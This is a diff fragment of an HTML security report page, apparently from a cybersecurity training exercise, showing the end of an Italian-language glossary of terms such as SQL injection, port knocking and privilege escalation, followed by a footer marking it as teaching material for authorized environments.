+        <tr><td class="mono">TTP</td><td>Tactics, Techniques, and Procedures</td></tr>
+        <tr><td class="mono">SQLi</td><td>SQL Injection</td></tr>
+        <tr><td class="mono">BCrypt</td><td>Funzione di hashing adattiva con salt integrato</td></tr>
+        <tr><td class="mono">CTF</td><td>Capture The Flag</td></tr>
+        <tr><td class="mono">Port Knocking</td><td>Apertura dinamica porte firewall tramite sequenza pacchetti</td></tr>
+        <tr><td class="mono">Steganografia</td><td>Tecnica di nascondere dati in file apparentemente normali</td></tr>
+        <tr><td class="mono">LPE</td><td>Local Privilege Escalation</td></tr>
+        <tr><td class="mono">WAF</td><td>Web Application Firewall</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     FOOTER
+     ══════════════════════════════════════ -->
+<footer>
+  <span>Enterprise Security Report · Build Week Cybersecurity</span>
+  <span class="classified">CONFIDENTIAL — Solo uso didattico in ambienti autorizzati</span>
+  <span>Team — DIGITAL AVENGERS</span>
+</footer>
+
+</body>
+</html>
